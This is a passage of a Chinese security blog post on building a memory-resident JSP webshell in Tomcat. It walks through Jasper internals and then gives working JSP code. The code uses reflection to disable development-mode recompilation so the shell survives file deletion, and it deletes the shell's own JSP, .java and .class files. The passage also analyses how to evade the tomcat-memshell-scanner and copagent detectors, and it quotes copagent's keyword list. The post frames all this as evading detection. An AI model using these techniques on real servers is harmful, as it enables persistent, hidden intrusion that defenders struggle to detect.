Constants.PRECOMPILE.length());\n        if (queryString.length() == 0) {\n            return true;             \u002F\u002F ?jsp_precompile\n        }\n        if (queryString.startsWith(\"&\")) {\n            return true;             \u002F\u002F ?jsp_precompile&foo=bar...\n        }\n        if (!queryString.startsWith(\"=\")) {\n            return false;            \u002F\u002F part of some other name or value\n        }\n       ...\n    }\n```\n\n那么预编译的作用是什么？当进行预编译后会怎么样？答案在`JspServletWrapper#service`中，当预编译后，请求便不会调用对应JSP的servlet的service方法进行处理，所以要想让我们的JSP能正常使用，当然是不要预编译的，默认情况下也不会预编译。\n\n```\npublic void service(HttpServletRequest request,\n                        HttpServletResponse response,\n                        boolean precompile)\n            throws ServletException, IOException, FileNotFoundException {\n        Servlet servlet;\n      ...\n\n            \u002F\u002F If a page is to be precompiled only, return.\n            if (precompile) {\n                return;\n     ...\n            \u002F*\n             * (4) Service request\n             *\u002F\n            if (servlet instanceof SingleThreadModel) {\n               \u002F\u002F sync on the wrapper so that the freshness\n               \u002F\u002F of the page is determined right before servicing\n               synchronized (this) {\n                   ``.service(request, response);\n                }\n            } else {\n                servlet.service(request, response);\n            }\n      ...\n```\n\n下面再来看`serviceJspFile`方法，该方法判断JSP是否已经被注册为一个Servlet，不存在则创建JspServletWrapper并put到`JspRuntimeContext`中，`JspServletWrapper.service`是核心方法。\n\n```\nprivate void serviceJspFile(HttpServletRequest request,\n                                HttpServletResponse response, String jspUri,\n                                boolean precompile)\n        throws ServletException, IOException {\n\u002F\u002F  首先判断JSP是否已经被注册为一个Servlet，ServletWrapper是Servlet的包装类，所有注册的JSP servlet都会被保存在JspRuntimeContext的jsps属性中，如果我们第一次请求这个JSP，当然是找不到wrapper的。\n        JspServletWrapper wrapper = rctxt.getWrapper(jspUri);\n        if (wrapper == null) {\n            synchronized(this) {\n                wrapper = rctxt.getWrapper(jspUri);\n                if (wrapper == null) {\n                 \u002F\u002F检查JSP文件是否存在\n                    if (null == context.getResource(jspUri)) {\n                        handleMissingResource(request, response, jspUri);\n                        return;\n                    }\n                    \u002F\u002F创建JspServletWrapper\n                    wrapper = new JspServletWrapper(config, options, jspUri,\n                                                 rctxt);\n                    \u002F\u002F添加wrapper到JspRuntimeContext的jsps属性中\n                    rctxt.addWrapper(jspUri,wrapper);\n                }\n            }\n        }\n        try {\n            \u002F\u002F核心方法\n            wrapper.service(request, response, precompile);\n        } catch (FileNotFoundException fnfe) {\n            handleMissingResource(request, response, jspUri);\n        }\n    }\n```\n\n`JspServletWrapper.service`主要做了如下操作。\n\n-   根据jsp生成java文件并编译为class\n\n-   将class文件注册为servlet\n-   调用`servlet.service`方法完成调用\n\nJSP生成java和class文件主要由下面的代码完成，这里的`options.getDevelopment()`代表的是部署模式。\n\ntomcat的开发模式和生产模式的设定是通过conf文件夹下面的web.xml文件来配置的。\n\n\u003E 在开发模式下，容器会经常检查jsp文件的时间戳来决定是否进行编译，如果jsp文件的时间戳比对应的.class文件的时间戳晚就证明jsp又进行了修改，需要再次编译，但是不断地进行时间戳的比对开销很大，会影响系统性能，而在生产模式下系统不会经常想的检查时间戳。所以一般在开发过程中使用开发模式，这样可以在jsp修改后再次访问就可以见到修改后的效果非常方便，而系统上线之后就要改为生产模式，虽然生产模式下会导致jsp的修改需要重启服务器才可以生效，但是上线后的改动较少而且性能很重要。\n\n默认Tomcat是以开发模式运行的。一般我们遇到的Tomcat都是以开发模式运行的，所以会由`JspCompilationContext#compile`进行编译。\n\n```\nif (options.getDevelopment() || mustCompile) {\n                synchronized (this) {\n                    if (options.getDevelopment() || mustCompile) {\n                        ctxt.compile();\n                        mustCompile = false;\n                    }\n                }\n            } else {\n                if (compileException != null) {\n                    \u002F\u002F Throw cached compilation exception\n                    throw compileException;\n                }\n            }\n```\n\n下面我们看下编译部分都做了什么，Tomcat默认使用`JDTCompiler`编译，首先通过`isOutDated`判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件，通过`jspCompiler.compile()`编译。\n\n```\npublic void compile() throws JasperException, FileNotFoundException {\n      \u002F\u002F获取编译器，默认使用JDTCompiler编译\n        createCompiler();\n      \u002F\u002F通过isOutDated决定是否编译\n        if (jspCompiler.isOutDated()) {\n            if (isRemoved()) {\n                throw new FileNotFoundException(jspUri);\n            }\n            try {\n                \u002F\u002F删除已经生成的java和Class文件\n                jspCompiler.removeGeneratedFiles();\n                jspLoader = null;\n                \u002F\u002F编译\n                jspCompiler.compile();\n                jsw.setReload(true);\n                jsw.setCompilationException(null);\n            ...\n    }\n```\n\n下面我们分析如何将生成的class文件注册为Servlet。首先判断`theServlet`是否为空，如果为空则表示还没有为JSP文件创建过Servlet，则通过`InstanceManager.newInstance`创建Servlet,并将创建的Servlet保存在`theServlet`属性中。\n\n```\npublic Servlet getServlet() throws ServletException {\n\u002F\u002F getReloadInternal是否Reload默认为False，也就是说如果theServlet为true就会直接返回。\n        if (getReloadInternal() || theServlet == null) {\n            synchronized (this) {\n\n                if (getReloadInternal() || theServlet == null) {\n             \u002F\u002F如果theServlet中有值则销毁该Servlet.\n                    destroy();\n                    final Servlet servlet;\n                    try {\n                        \u002F\u002F创建Servlet实例\n                        InstanceManager instanceManager = InstanceManagerFactory.getInstanceManager(config);\n                        servlet = (Servlet) instanceManager.newInstance(ctxt.getFQCN(), ctxt.getJspLoader());\n                    } catch (Exception e) {\n                        Throwable t = ExceptionUtils\n                                .unwrapInvocationTargetException(e);\n                        ExceptionUtils.handleThrowable(t);\n                        throw new JasperException(t);\n                    }\n                \u002F\u002F初始化servlet\n                    servlet.init(config);\n                    if (theServlet != null) {\n                        ctxt.getRuntimeContext().incrementJspReloadCount();\n                    }\n                \u002F\u002F将servlet保存到theServlet中，theServlet由volatile修饰，在线程之间可以共享。\n                    theServlet = servlet;\n                    reload = false;\n                }\n            }\n        }\n        return theServlet;\n    }\n```\n\n下面有一个小知识点，`theServlet`是由`volatile`修饰的，在不同的线程之间可以共享，再通过`synchronized (this)`加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要`this`是一个值，那么`theServlet`属性的值是一样的，而`this`就是当前的`jspServletWrapper`，我们访问不同的JSP也是由不同的`jspServletWrapper`处理的。\n\n最后就是调用`servlet.service`方法完成请求处理。\n\n## 内存驻留分析\n\n上面我们已经分析完了JSP的处理逻辑，要想要完成内存驻留，我们要解决下面的问题。\n\n-   请求后不去检查JSP文件是否存在\n-   theServlet中一直保存着我们的servlet，当我们请求对应url还能交给我们的servlet处理\n\n第二个问题比较容易，`theServlet`能否获取到Servlet或者获取到哪个Servlet和`jspServletWrapper`是有关的，而在`JspServlet#serviceJspFile`中，如果我们已经将Servlet注册过，可以根据url从`JspRuntimeContext`中获取得到对应的`jspServletWrapper`。\n\n```\nprivate void serviceJspFile(HttpServletRequest request,\n                                HttpServletResponse response, String jspUri,\n                                boolean precompile)\n        throws ServletException, IOException {\n        JspServletWrapper wrapper = rctxt.getWrapper(jspUri);\n        if (wrapper == null) {\n       ...\n        }\n        try {\n            wrapper.service(request, response, precompile);\n        } catch (FileNotFoundException fnfe) {\n            handleMissingResource(request, response, jspUri);\n        }\n    }\n```\n\n### 绕过方法一\n\n下面解决`请求后不去检查JSP文件是否存在`问题，首先我想绕过下面的判断,如果我们能让\n\n`options.getDevelopment()`返回false就不会进入`complie`部分。\n\n```\nif (options.getDevelopment() || mustCompile) {\n                synchronized (this) {\n                    if (options.getDevelopment() || mustCompile) {\n                        \u002F\u002F The following sets reload to true, if necessary\n                        ctxt.compile();\n                        mustCompile = false;\n                    }\n                }\n            }\n```\n\n`development`并不是一个`static`属性，所以不能直接修改，要拿到`options`的对象。\n\n```\nprivate boolean development = true;\n```\n\n`options`对象被存储在`JspServlet`中，\n\n```\npublic class JspServlet extends HttpServlet implements PeriodicEventListener {\n...\n    private transient Options options;\n```\n\n`MappingData`中保存了路由匹配的结果,`MappingData`的`wrapper`字段包含处理请求的`wrapper`，在Tomcat中，`Wrapper`代表一个Servlet，它负责管理一个 Servlet，包括的 Servlet的装载、初始化、执行以及资源回收。在`Wrapper`的`instance`属性中保存着`servlet`的实例，因此我们可以从`MappingData`中拿到`JspServlet`进而更改`options`的`development`属性值。\n\n```\npublic class MappingData {\n    public Host host = null;\n    public Context context = null;\n    public int contextSlashCount = 0;\n    public Context[] contexts = null;\n    public Wrapper wrapper = null;\n    public boolean jspWildCard = false;\n}\n```\n\n[![]()](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b52c1a2d8311ecb823fa163e8ef7b7.png)\n\n所以我们可以通过反射对`development`的属性修改，下面代码参考[Tomcat容器攻防笔记之JSP金蝉脱壳](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F224698)\n\n```\n\u003C%\n    \u002F\u002F从request对象中获取request属性\n    Field requestF = request.getClass().getDeclaredField(\"request\");\n    requestF.setAccessible(true);\n    Request req = (Request) requestF.get(request);\n    \u002F\u002F获取MappingData\n    MappingData mappingData = req.getMappingData();\n    \u002F\u002F获取Wrapper\n    Field wrapperF = mappingData.getClass().getDeclaredField(\"wrapper\");\n    wrapperF.setAccessible(true);\n    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);\n    \u002F\u002F获取jspServlet对象\n    Field instanceF = wrapper.getClass().getDeclaredField(\"instance\");\n    instanceF.setAccessible(true);\n    Servlet jspServlet = (Servlet) instanceF.get(wrapper);\n    \u002F\u002F获取options中保存的对象 \n    Field Option = jspServlet.getClass().getDeclaredField(\"options\");\n    Option.setAccessible(true);\n    EmbeddedServletOptions op = (EmbeddedServletOptions) Option.get(jspServlet);\n    \u002F\u002F设置development属性为false\n    Field Developent = op.getClass().getDeclaredField(\"development\");\n    Developent.setAccessible(true);\n    Developent.set(op,false);\n%\u003E\n```\n\n既然已经分析好了，我们做一个测试， **当我们第二次请求我们的脚本**`development`\\\n**的属性值已经被改为false,即使我们删除对应的**`jsp\\java\\Class`**文件，仍然还可以还可以正常请求shell。**\n\n[![]()](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b70cc42d8311ecb823fa163e8ef7b7.png)\n\n**那么经过修改后会不会导致后来上传的jsp文件都无法执行的问题呢？**\n\n不会，因为每一个JSP文件，只有已经编译并且注册为Servlet后，`mustCompile`属性才会为False，默认为True，并且`mustCompile`也是由`volatile`修饰并且在`synchronized`加锁的代码块中，只有同一个`jspServletWrapper`的`mustCompile`的修改在下次请求时还有效。当然也不是说完全没有影响，\\\n**如果我们想修改一个已经加载为**`Servlet` **的JSP文件，即使修改了也不会生效。**\n\n```\nif (options.getDevelopment() || mustCompile) {\n                synchronized (this) {\n                    if (options.getDevelopment() || mustCompile) {\n                        ctxt.compile();\n                        mustCompile = false;\n                    }\n                }\n```\n\n### 绕过方法二\n\n下一个我们有机会绕过的点在compile中，如果我们能让`isOutDated`返回false，也可以达到绕过的目的。\n\n```\npublic void compile() throws JasperException, FileNotFoundException {\n        createCompiler();\n        if (jspCompiler.isOutDated()) {\n         ...\n        }\n    }\n```\n\n注意看下面的代码,在`isOutDated`中，当满足下面的条件则会返回false。`jsw`中保存的是`jspServletWarpper`对象，所以是不为null的，并且`modificationTestInterval`默认值是4也满足条件，所以我们现在要做的就是让`modificationTestInterval*1000`大于`System.currentTimeMillis()`,所以\\\n**只要将**`**modificationTestInterval**` **修改为一个比较大的值也可以达到绕过的目的。**\n\n```\npublic boolean isOutDated(boolean checkClass) {\n        if (jsw != null\n                && (ctxt.getOptions().getModificationTestInterval() \u003E 0)) {\n            if (jsw.getLastModificationTest()\n                    + (ctxt.getOptions().getModificationTestInterval() * 1000) \u003E System.currentTimeMillis()) {\n                return false;\n            }\n        }\n```\n\n`modificationTestInterval`也保存在`options`属性中，所以修改的方法和方法一类似，就不罗列代码了。\n\n```\npublic final class EmbeddedServletOptions implements Options {\n...\n   private int modificationTestInterval = 4;\n    ...\n}\n```\n\n## 查杀情况分析\n\n**tomcat-memshell-scanner**\n\n这款工具会Dump出所有保存在`servletMappings`中的`Servlet`的信息，不过我们的JSPServlet并没有保存在`servletMappings`中，而是在`JspRuntimeContext#jsps`字段中，因此根本查不到。\n\n[![]()](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38a5e9442d8311ecb823fa163e8ef7b7.png)\n\n[![]()](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b692582d8311ecb823fa163e8ef7b7.png)\n\n### copagent\n\nJSP本质上也就是`Servlet`，编译好的Class继承了`HttpJspBase`，类图如下所示。\n\n[![]()](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b571522d8311ecb823fa163e8ef7b7.png)\n\n#### copagent流程分析\n\n`copagent`首先获取所有已经加载的类，并创建了几个数组。\n\n-   `riskSuperClassesName`中保存了`HttpServlet`，用于获取Servlet，因为我们注册的Servlet会直接或者间接继承`HttpServlet`\n-   `riskPackage`保存了一些恶意的包名，比如冰蝎的包名为`net.rebeyond`，使用冰蝎连接webshell时会将自己的恶意类加载到内存，而这个恶意类也是以`net.rebeyond`为包名的\n-   `riskAnnotations`保存了SpringMVC中注解注册Controller的类型，显然是为了抓出所有SpringMVC中通过注解注册的Controller\n\n```\nprivate static synchronized void catchThief(String name, Instrumentation ins){\n   ...\n        List\u003CClass\u003C?\u003E\u003E resultClasses = new ArrayList\u003CClass\u003C?\u003E\u003E();\n        \u002F\u002F 获得所有已加载的类及类名\n        Class\u003C?\u003E[] loadedClasses = ins.getAllLoadedClasses();\n        LogUtils.logit(\"Found All Loaded Classes    : \" + loadedClasses.length);\n        List\u003CString\u003E loadedClassesNames = new ArrayList\u003CString\u003E();\n        for(Class\u003C?\u003E cls: loadedClasses){\n            loadedClassesNames.add(cls.getName());\n        }\n   ...\n        \u002F\u002F 实现的可能具有 web shell 功能的父类名\n        List\u003CString\u003E riskSuperClassesName = new ArrayList\u003CString\u003E();\n        riskSuperClassesName.add(\"javax.servlet.http.HttpServlet\");\n        \u002F\u002F 黑名单拦截\n        List\u003CString\u003E riskPackage = new ArrayList\u003CString\u003E();\n        riskPackage.add(\"net.rebeyond.\");\n        riskPackage.add(\"com.metasploit.\");\n        \u002F\u002F 风险注解\n        List\u003CString\u003E riskAnnotations = new ArrayList\u003CString\u003E();\n        riskAnnotations.add(\"org.springframework.stereotype.Controller\");\n      riskAnnotations.add(\"org.springframework.web.bind.annotation.RestController\");      riskAnnotations.add(\"org.springframework.web.bind.annotation.RequestMapping\");\n        riskAnnotations.add(\"org.springframework.web.bind.annotation.GetMapping\");\n        riskAnnotations.add(\"org.springframework.web.bind.annotation.PostMapping\");\n        riskAnnotations.add(\"org.springframework.web.bind.annotation.PatchMapping\");\n        riskAnnotations.add(\"org.springframework.web.bind.annotation.PutMapping\");\n        riskAnnotations.add(\"org.springframework.web.bind.annotation.Mapping\");\n    ...\n```\n\n下面代码完成主要的检测逻辑，首先会检测包名和SpringMVC注解的类，检测到则添加到`resultClasses`中，并且修改`not_found`标志位为False，表示不检测`Servelt\u002FFilter\u002FListener`类型的shell。\n\n```\nfor(Class\u003C?\u003E clazz: loadedClasses){\n                Class\u003C?\u003E target = clazz;\n                boolean not_found = true;\n      \u002F\u002F检测包名是否为恶意包名，如果是则设置not_found为false，代表已经被shell连接过了，跳过后面Servlet和Filter内存马部分的检测并Dump出恶意类的信息。\n                for(String packageName: riskPackage){\n                    if(clazz.getName().startsWith(packageName)){\n                        resultClasses.add(clazz);\n                        not_found = false;\n                        ClassUtils.dumpClass(ins, clazz.getName(), false, Integer.toHexString(target.getClassLoader().hashCode()));\n                        break;\n                    }\n                }\n    \u002F\u002F判断是否使用SpringMVC的注解注册Controller，如果是则Dump出使用注解的Controller的类的信息\n                if(ClassUtils.isUseAnnotations(clazz, riskAnnotations)){\n                    resultClasses.add(clazz);\n                    not_found = false;\n                    ClassUtils.dumpClass(ins, clazz.getName(), false, Integer.toHexString(target.getClassLoader().hashCode()));\n                }\n      \u002F\u002F检测Servelt\u002FFilter\u002FListener类型Webshell\n      if(not_found){\n                    \u002F\u002F 递归查找\n                    while (target != null && !target.getName().equals(\"java.lang.Object\")){\n                        \u002F\u002F 每次都重新获得目标类实现的所有接口\n                        interfaces = new ArrayList\u003CString\u003E();\n                        for(Class\u003C?\u003E cls: target.getInterfaces()){\n                            interfaces.add(cls.getName());\n                        }\n                        if( \u002F\u002F 继承危险父类的目标类\n                                (target.getSuperclass() != null && riskSuperClassesName.contains(target.getSuperclass().getName())) ||\n                                        \u002F\u002F 实现特殊接口的目标类\n                                        target.getName().equals(\"org.springframework.web.servlet.handler.AbstractHandlerMapping\") ||\n                                        interfaces.contains(\"javax.servlet.Filter\") ||\n                                        interfaces.contains(\"javax.servlet.Servlet\") ||\n                                        interfaces.contains(\"javax.servlet.ServletRequestListener\")\n                        )\n                        {\n     ...\n                            if(loadedClassesNames.contains(clazz.getName())){\n                                resultClasses.add(clazz);\n                                ClassUtils.dumpClass(ins, clazz.getName(), false, Integer.toHexString(clazz.getClassLoader().hashCode()));\n                            }else{\n                               ...\n                            }\n                            break;\n                        }\n                        target = target.getSuperclass();\n                    }\n                }\n```\n\n我们主要关注`Servlet`的检测，首先获取当前Class的实现接口，如果Class的父类不为空并且父类不是`HttpServlet`，并且没有实现`Serlvet\\Filter\\ServletRequestListener`等接口则不会被添加到`resultClasses`但会递归的去检查父类。由于JSP文件实际继承了`HttpJspBase`，相当于间接继承了`HttpServlet`，所以是绕不过这里的检查的，不过没关系，这一步只是检查是否是Servlet，并不代表被检测出来了。\n\n```\nwhile (target != null && !target.getName().equals(\"java.lang.Object\")){\n                        \u002F\u002F 每次都重新获得目标类实现的所有接口\n                        interfaces = new ArrayList\u003CString\u003E();\n                        for(Class\u003C?\u003E cls: target.getInterfaces()){\n                            interfaces.add(cls.getName());\n                        }\n                        if( \u002F\u002F 继承危险父类的目标类\n                                (target.getSuperclass() != null && riskSuperClassesName.contains(target.getSuperclass().getName())) ||\n                                        \u002F\u002F 实现特殊接口的目标类\n                                        target.getName().equals(\"org.springframework.web.servlet.handler.AbstractHandlerMapping\") ||interfaces.contains(\"javax.servlet.Filter\") ||interfaces.contains(\"javax.servlet.Servlet\") ||interfaces.contains(\"javax.servlet.ServletRequestListener\")\n                        )\n                        {\n                            if(loadedClassesNames.contains(clazz.getName())){\n                                resultClasses.add(clazz);\n                                ClassUtils.dumpClass(ins, clazz.getName(), false, Integer.toHexString(clazz.getClassLoader().hashCode()));\n                            }else{\n                                LogUtils.logit(\"cannot find \" + clazz.getName() + \" classes in instrumentation\");\n                            }\n                            break;\n                      ...\n                        }\n                        target = target.getSuperclass();\n                    }\n```\n\n下面是判断是否为恶意内容的核心，只有当`resultClasses`中包含了关键下面的关键字才会被标记为high，这里如果我们使用自定义马的话也是可以绕过的，但是如果要使用冰蝎,一定会被`javax.crypto.`加密包的规则检测到，如果是自定义加密算法也是可以绕过的。\n\n```\nList\u003CString\u003E riskKeyword = new ArrayList\u003CString\u003E();\n        riskKeyword.add(\"javax.crypto.\");\n        riskKeyword.add(\"ProcessBuilder\");\n        riskKeyword.add(\"getRuntime\");\n        riskKeyword.add(\"shell\");\n...\n        for(Class\u003C?\u003E clazz: resultClasses){\n            File dumpPath = PathUtils.getStorePath(clazz, false);\n            String level = \"normal\";\n            String content = PathUtils.getFileContent(dumpPath);\n            for(String keyword: riskKeyword){\n                if(content.contains(keyword)){\n                    level = \"high\";\n                    break;\n                }\n            }\n```\n\n## 自删除\n\n上面只是分析了如何让我们的JSP在删除了`JSP\\java\\Class`文件后还能访问，下面我们分析如何在`JSP`中实现删除`JSP\\java\\Class`文件，在`JspCompilationContext`保存着JSP编译的上下文信息，我们可以从中拿到`java\u002Fclass`的绝对路径。\n\n[![]()](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b4688e2d8311ecb823fa163e8ef7b7.png)\n\n而`JspCompilationContext`对象保存在`JspServletWrapper`中，所以要先获取`JspServletWrapper`。\n\n```\npublic JspServletWrapper(ServletConfig config, Options options,\n            String jspUri, JspRuntimeContext rctxt) {\n        ...\n        ctxt = new JspCompilationContext(jspUri, options,\n                                         config.getServletContext(),\n                                         this, rctxt);\n    }\n```\n\n`request.request.getMappingData().wrapper.instance.rctxt.jsps.get(\"\u002Fjsp.jsp\")`\n\n[![]()](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38a585802d8311ecb823fa163e8ef7b7.png)\n\n下面是代码实现\n\n```\n\u003C%\n    \u002F\u002F从request对象中获取request属性\n    Field requestF = request.getClass().getDeclaredField(\"request\");\n    requestF.setAccessible(true);\n    Request req = (Request) requestF.get(request);\n    \u002F\u002F获取MappingData\n    MappingData mappingData = req.getMappingData();\n    \u002F\u002F获取Wrapper，这里的Wrapper是StandrardWrapper\n    Field wrapperF = mappingData.getClass().getDeclaredField(\"wrapper\");\n    wrapperF.setAccessible(true);\n    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);\n    \u002F\u002F获取jspServlet对象\n    Field instanceF = wrapper.getClass().getDeclaredField(\"instance\");\n    instanceF.setAccessible(true);\n    Servlet jspServlet = (Servlet) instanceF.get(wrapper);\n    \u002F\u002F获取rctxt属性\n    Field rctxt = jspServlet.getClass().getDeclaredField(\"rctxt\");\n    rctxt.setAccessible(true);\n    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);\n    \u002F\u002F获取jsps属性内容\n    Field jspsF = jspRuntimeContext.getClass().getDeclaredField(\"jsps\");\n    jspsF.setAccessible(true);\n    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);\n    \u002F\u002F获取对应的JspServletWrapper\n    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());\n    \u002F\u002F获取ctxt属性保存的JspCompilationContext对象\n    Field ctxt = jsw.getClass().getDeclaredField(\"ctxt\");\n    ctxt.setAccessible(true);\n    JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);\n    File targetFile;\n    targetFile = new File(jspCompContext.getClassFileName());\u002F\u002F删掉jsp的.class\n    targetFile.delete();\n    targetFile = new File(jspCompContext.getServletJavaFileName());\u002F\u002F删掉jsp的java文件\n    targetFile.delete();\n    \u002F\u002F删除JSP文件\n    String __jspName = this.getClass().getSimpleName().replaceAll(\"_\", \".\");\n    String path=application.getRealPath(__jspName);\n    File file = new File(path);\n    file.delete();\n%\u003E\n```\n\n最后有个不兼容的小BUG，tomcat7和8\u002F9的`MappingData`类包名发生了变化\n\n```\ntomcat7:\u003C%@ page import=\"org.apache.tomcat.util.http.mapper.MappingData\" %\u003E\ntomcat8\u002F9:\u003C%@ page import=\"org.apache.catalina.mapper.MappingData\" %\u003E\n```\n\n[参考文献](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=https%3A%2F%2Fxz.aliyun.com%2Ft%2F10372)\n\n## 总结\n\n虽然不能使用冰蝎等webshell绕过这两款工具的检测，但是当我们了解了查杀原理，将自己的webshell稍微改一下，也是可以绕过的\n",display_count:d,is_markdown:g},author_user_info:{user_id:"3096695179321544",user_name:"安全白板",company:e,job_title:e,avatar_large:"https:\u002F\u002Fp3-passport.byteacctimg.com\u002Fimg\u002Fuser-avatar\u002F5b4fe90aaf79de49689ec22ea8e27561~300x300.image",level:5,description:"网络安全使者，学习网络安全技术",followee_count:d,follower_count:56,post_article_count:366,digg_article_count:15,got_digg_count:210,got_view_count:106140,post_shortmsg_count:d,digg_shortmsg_count:d,isfollowed:a,favorable_author:d,power:6276,study_point:d,university:{university_id:f,name:e,logo:e},major:{major_id:f,parent_id:f,name:e},student_status:d,select_event_count:d,select_online_course_count:d,identity:d,is_select_annual:a,select_annual_rank:d,annual_list_type:d,extraMap:{},is_logout:d,annual_info:[],account_amount:d,user_growth_info:{user_id:3096695179321544,jpower:6276,jscore:10.4,jpower_level:5,jscore_level:g,jscore_title:"预备掘友",author_achievement_list:[g],vip_level:d,vip_title:e,jscore_next_level_score:15,jscore_this_level_mini_score:d},is_vip:a,become_author_days:d,collection_set_article_count:d},category:{category_id:"6809637776263217160",category_name:"代码人生",category_url:"career",rank:7,back_ground:e,icon:e,ctime:1553759544,mtime:1553759548,show_type:3,item_type:u,promote_tag_cap:4,promote_priority:7,id:"6809637776263217160",name:"代码人生",title:"代码人生",alias:"career"},tags:[{entriesCount:void 0,subscribed:a,id:"6809640422172786702",tag_id:"6809640422172786702",tag_name:"安全",color:"#60ADFF",icon:"https:\u002F\u002Fp1-jj.byteimg.com\u002Ftos-cn-i-t2oaga2asx\u002Fleancloud-assets\u002F0d0249202f5462360439.png~tplv-t2oaga2asx-image.image",back_ground:e,show_navi:d,ctime:1435972736,mtime:1668491027,id_type:9,tag_alias:e,post_article_count:28344,concern_user_count:85275,title:"安全",tagId:"6809640422172786702",articleCount:28344,subscribersCount:85275,createdAt:c,updatedAt:c}],user_interact:{id:7020701580210995000,omitempty:u,user_id:d,is_digg:a,is_follow:a,is_collect:a},org:{org_info:c,org_user:c,is_followed:a},req_id:"202211151358430102120761500C582FA5",status:{push_status:d},author_interact:c,extra:{boost_type:e},title:"【Web安全】JSP内存马研究",user:{id:"3096695179321544",self_description:void 0,followed:a,viewerIsFollowing:void 0,community:void 0,subscribedTagCount:d,wroteBookCount:d,boughtBookCount:d,isBindedPhone:a,level:5,user_id:"3096695179321544",user_name:"安全白板",company:e,job_title:e,avatar_large:"https:\u002F\u002Fp3-passport.byteacctimg.com\u002Fimg\u002Fuser-avatar\u002F5b4fe90aaf79de49689ec22ea8e27561~300x300.image",description:"网络安全使者，学习网络安全技术",followee_count:d,follower_count:56,post_article_count:366,digg_article_count:15,got_digg_count:210,got_view_count:106140,post_shortmsg_count:d,digg_shortmsg_count:d,isfollowed:a,favorable_author:d,power:6276,study_point:d,university:{university_id:f,name:e,logo:e},major:{major_id:f,parent_id:f,name:e},student_status:d,select_event_count:d,select_online_course_count:d,identity:d,is_select_annual:a,select_annual_rank:d,annual_list_type:d,extraMap:{},is_logout:d,annual_info:[],account_amount:d,user_growth_info:{user_id:3096695179321544,jpower:6276,jscore:10.4,jpower_level:5,jscore_level:g,jscore_title:"预备掘友",author_achievement_list:[g],vip_level:d,vip_title:e,jscore_next_level_score:15,jscore_this_level_mini_score:d},is_vip:a,become_author_days:d,collection_set_article_count:d,juejinPower:6276,jobTitle:e,roles:{isBookAuthor:a,isFavorableAuthor:a,isCobuilder:a,isAdmin:a},username:"安全白板",blogAddress:void 0,selfDescription:"网络安全使者，学习网络安全技术",beLikedCount:210,beReadCount:106140,followerCount:56,followingCount:d,collectionCount:d,createdCollectionCount:d,followingCollectionCount:d,postedPostsCount:366,pinCount:d,likedArticleCount:15,likedPinCount:d,avatar:"https:\u002F\u002Fp3-passport.byteacctimg.com\u002Fimg\u002Fuser-avatar\u002F5b4fe90aaf79de49689ec22ea8e27561~300x300.image",latestLoginedInAt:c,createdAt:c,updatedAt:c,phoneNumber:e,titleDescription:e,followeesCount:d,applyEventCount:d,need_lead:d,followTopicCnt:void 0},viewCount:void 0,commentsCount:d,isEvent:void 0,abstract:"前言 最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的Servlet和Filter拿出来，排",latestCommentAt:c,createdAt:new Date(1634634516000),updatedAt:c,isTopicEvent:a,likedCount:g,likeCount:g,content:e,originalUrl:e,type:"post",collected:a,viewsCount:797,username:"安全白板",viewerHasLiked:a,draftId:"7020701466918682631",collectionCount:g},entryView:{},author:{id:"3096695179321544",self_description:void 0,followed:a,viewerIsFollowing:void 0,community:void 0,subscribedTagCount:d,wroteBookCount:d,boughtBookCount:d,isBindedPhone:a,level:5,user_id:"3096695179321544",user_name:"安全白板",company:e,job_title:e,avatar_large:"https:\u002F\u002Fp3-passport.byteacctimg.com\u002Fimg\u002Fuser-avatar\u002F5b4fe90aaf79de49689ec22ea8e27561~300x300.image",description:"网络安全使者，学习网络安全技术",followee_count:d,follower_count:56,post_article_count:366,digg_article_count:15,got_digg_count:210,got_view_count:106140,post_shortmsg_count:d,digg_shortmsg_count:d,isfollowed:a,favorable_author:d,power:6276,study_point:d,university:{university_id:f,name:e,logo:e},major:{major_id:f,parent_id:f,name:e},student_status:d,select_event_count:d,select_online_course_count:d,identity:d,is_select_annual:a,select_annual_rank:d,annual_list_type:d,extraMap:{},is_logout:d,annual_info:[],account_amount:d,user_growth_info:{user_id:3096695179321544,jpower:6276,jscore:10.4,jpower_level:5,jscore_level:g,jscore_title:"预备掘友",author_achievement_list:[g],vip_level:d,vip_title:e,jscore_next_level_score:15,jscore_this_level_mini_score:d},is_vip:a,become_author_days:d,collection_set_article_count:d,juejinPower:6276,jobTitle:e,roles:{isBookAuthor:a,isFavorableAuthor:a,isCobuilder:a,isAdmin:a},username:"安全白板",blogAddress:void 